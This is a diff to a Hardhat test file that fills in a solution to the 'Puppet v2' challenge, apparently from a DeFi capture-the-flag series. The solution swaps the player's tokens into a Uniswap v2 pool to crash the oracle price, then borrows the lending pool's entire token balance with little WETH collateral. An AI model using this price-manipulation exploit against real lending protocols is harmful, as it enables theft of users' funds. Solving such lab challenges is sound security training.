@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { getContractFactory } = require("@nomiclabs/hardhat-ethers/types");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -12,7 +13,9 @@ describe('[Challenge] Puppet v2', function () {
 
     // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
     const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
+    const UNISWAP_INITIAL_TOKEN_RESERVE2 = 10n * 10n ** 18n;
     const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;
+    const UNISWAP_INITIAL_WETH_RESERVE2 = 9n * 10n ** 18n;
 
     const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;
@@ -83,6 +86,14 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address,PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE,0,[token.address, uniswapRouter.WETH()],player.address,9999999999);
+
+        const requiredCollateral = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        await weth.connect(player).deposit({ value: requiredCollateral });
+        await weth.connect(player).approve(lendingPool.address,requiredCollateral);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
